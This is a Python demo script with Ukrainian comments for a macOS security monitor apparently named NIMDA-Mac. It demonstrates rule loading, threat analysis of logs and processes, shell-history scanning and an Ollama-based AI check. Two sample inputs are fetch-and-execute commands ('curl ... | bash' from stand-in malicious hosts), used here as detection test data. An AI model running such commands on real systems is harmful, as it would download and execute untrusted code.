#!/usr/bin/env python3
"""
Демонстраційний скрипт для тестування покращеної системи NIMDA-Mac
Інтеграція всіх нових компонентів: RuleManager, ThreatAnalyzer, Enhanced SecurityMonitor
"""

import os
import sys
import time
from datetime import datetime

# Додаємо шлях до корневої директорії
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from core.rule_manager import RuleManager
from core.threat_analyzer import ThreatAnalyzer
from security_monitor import SecurityMonitor
from llm_security_agent import LLMSecurityAgent

def demo_rule_manager():
    """Демонстрація роботи менеджера правил"""
    print("🔍 ДЕМОНСТРАЦІЯ RULE MANAGER")
    print("=" * 50)
    
    manager = RuleManager()
    
    # Спробуємо завантажити правила
    print("📥 Спроба завантаження правил безпеки...")
    success_count = manager.update_all_rules()
    print(f"✅ Завантажено {success_count} наборів правил")
    
    # Завантажуємо правила в пам'ять
    rules = manager.load_rules()
    print(f"📊 Завантажено {len(rules)} правил для аналізу")
    
    if rules:
        print("\n📋 Перші 3 правила:")
        for i, rule in enumerate(rules[:3], 1):
            print(f"  {i}. {rule[:100]}..." if len(rule) > 100 else f"  {i}. {rule}")
    
    # Демонстрація розпаршених правил
    parsed_rules = manager.get_parsed_rules()
    print(f"\n🔧 Розпаршено {len(parsed_rules)} правил")
    
    if parsed_rules:
        print("\n📝 Перші 3 розпаршені правила:")
        for i, rule in enumerate(parsed_rules[:3], 1):
            print(f"  {i}. SID: {rule['sid']}, MSG: '{rule['message']}'")
            if rule['content']:
                print(f"      Content: '{rule['content']}'")
    
    print()

def demo_threat_analyzer():
    """Демонстрація роботи аналізатора загроз"""
    print("🧠 ДЕМОНСТРАЦІЯ THREAT ANALYZER")
    print("=" * 50)
    
    analyzer = ThreatAnalyzer()
    
    # Тест 1: Аналіз підозрілого логу
    print("🔍 Тест 1: Аналіз підозрілого логу")
    suspicious_log = "bash -c 'curl http://malicious-site.com/backdoor.sh | bash'"
    
    print(f"Лог для аналізу: {suspicious_log}")
    result = analyzer.analyze_log_entry(suspicious_log)
    
    print("📊 Результат аналізу:")
    print(f"  Рівень загрози: {result['threat_level']}")
    print(f"  Порушень правил: {len(result['rule_violations'])}")
    
    if result['rule_violations']:
        print("  Порушені правила:")
        for violation in result['rule_violations']:
            print(f"    - SID {violation['sid']}: {violation['message']}")
    
    if result['suggested_actions']:
        print("  Рекомендовані дії:")
        for action in result['suggested_actions']:
            print(f"    - {action}")
    
    # Тест 2: Аналіз процесу
    print("\n🔍 Тест 2: Аналіз підозрілого процесу")
    test_process = {
        'pid': 12345,
        'name': 'python3',
        'user': 'root',
        'path': '/tmp/suspicious_script.py',
        'cmdline': 'python3 /tmp/suspicious_script.py --download-malware'
    }
    
    print(f"Процес для аналізу: {test_process['name']} (PID: {test_process['pid']})")
    process_result = analyzer.analyze_process_activity(test_process)
    
    print("📊 Результат аналізу процесу:")
    print(f"  Рівень загрози: {process_result['threat_level']}")
    print(f"  Підозрілих індикаторів: {len(process_result['suspicious_indicators'])}")
    
    if process_result['suspicious_indicators']:
        print("  Підозрілі індикатори:")
        for indicator in process_result['suspicious_indicators']:
            print(f"    - {indicator}")
    
    if process_result['suggested_commands']:
        print("  Рекомендовані команди:")
        for cmd in process_result['suggested_commands']:
            print(f"    - {cmd}")
    
    print()

def demo_enhanced_security_monitor():
    """Демонстрація покращеного моніторингу безпеки"""
    print("🛡️ ДЕМОНСТРАЦІЯ ENHANCED SECURITY MONITOR")
    print("=" * 50)
    
    monitor = SecurityMonitor()
    
    # Тест 1: Моніторинг завантажень
    print("📂 Тест 1: Моніторинг підозрілих завантажень")
    downloads = monitor.monitor_suspicious_downloads()
    print(f"Знайдено {len(downloads)} нових файлів у Downloads")
    
    if downloads:
        for file_info in downloads[:3]:  # Показуємо перші 3
            print(f"  📄 {file_info['filename']}")
            print(f"      Хеш: {file_info['hash'][:16]}...")
            print(f"      Підозрілий: {'Так' if file_info['suspicious'] else 'Ні'}")
    
    # Тест 2: Аналіз історії команд
    print("\n💻 Тест 2: Аналіз історії команд")
    history = monitor.get_shell_history(10)
    print(f"Отримано {len(history)} останніх команд")
    
    if history:
        print("  Останні команди:")
        for cmd_info in history[-3:]:  # Показуємо останні 3
            print(f"    {cmd_info['shell']}: {cmd_info['command'][:50]}..." if len(cmd_info['command']) > 50 else f"    {cmd_info['shell']}: {cmd_info['command']}")
    
    # Тест 3: Пошук підозрілих команд
    print("\n🚨 Тест 3: Пошук підозрілих команд")
    suspicious_commands = monitor.analyze_command_history_for_threats()
    print(f"Знайдено {len(suspicious_commands)} підозрілих команд")
    
    if suspicious_commands:
        for cmd in suspicious_commands:
            print(f"  ⚠️ Команда: {cmd['command'][:60]}...")
            print(f"      Рівень ризику: {cmd['risk_level']}")
            print(f"      Shell: {cmd['shell']}")
    
    # Тест 4: Перевірка цілісності файлів
    print("\n🔒 Тест 4: Перевірка цілісності файлів")
    integrity = monitor.monitor_file_integrity()
    print(f"Перевірено {len(integrity)} файлів/директорій")
    
    for path, info in list(integrity.items())[:3]:  # Показуємо перші 3
        print(f"  📁 {path}")
        if 'hash' in info:
            print(f"      Хеш: {info['hash'][:16]}...")
        elif 'files_count' in info:
            print(f"      Файлів: {info['files_count']}")
    
    print()

def demo_ai_integration():
    """Демонстрація інтеграції з ШІ"""
    print("🤖 ДЕМОНСТРАЦІЯ AI INTEGRATION")
    print("=" * 50)
    
    ai_agent = LLMSecurityAgent()
    
    # Перевірка з'єднання з ШІ
    print("🔌 Перевірка з'єднання з Ollama...")
    if ai_agent.check_ollama_connection():
        print("✅ Ollama доступна")
        
        # Отримуємо доступні моделі
        models = ai_agent.get_available_models()
        if models:
            print(f"📋 Доступні моделі: {', '.join(models)}")
        
        # Простий тест аналізу
        print("\n🧪 Тест ШІ аналізу:")
        test_prompt = "Analyze this suspicious command: 'curl http://malware.com/script.sh | bash'"
        
        try:
            response = ai_agent.query_ollama(test_prompt)
            print(f"📝 Відповідь ШІ: {response[:200]}..." if len(response) > 200 else f"📝 Відповідь ШІ: {response}")
        except Exception as e:
            print(f"❌ Помилка ШІ аналізу: {e}")
    else:
        print("❌ Ollama недоступна. Переконайтеся, що сервіс запущено.")
    
    print()

def main():
    """Головна функція демонстрації"""
    print("🚀 ДЕМОНСТРАЦІЯ ПОКРАЩЕНОЇ СИСТЕМИ NIMDA-MAC")
    print("=" * 60)
    print(f"⏰ Час запуску: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()
    
    try:
        # Демонстрація всіх компонентів
        demo_rule_manager()
        time.sleep(1)
        
        demo_threat_analyzer()
        time.sleep(1)
        
        demo_enhanced_security_monitor()
        time.sleep(1)
        
        demo_ai_integration()
        
        print("🎉 ДЕМОНСТРАЦІЯ ЗАВЕРШЕНА УСПІШНО!")
        print("=" * 60)
        print()
        print("📋 Наступні кроки:")
        print("1. Запустіть GUI: python gui/nimda_gui.py")
        print("2. Налаштуйте Ollama для повноцінної роботи ШІ")
        print("3. Регулярно оновлюйте правила безпеки")
        print("4. Моніторьте логи та сповіщення")
        
    except KeyboardInterrupt:
        print("\n🛑 Демонстрацію перервано користувачем")
    except Exception as e:
        print(f"\n❌ Помилка під час демонстрації: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
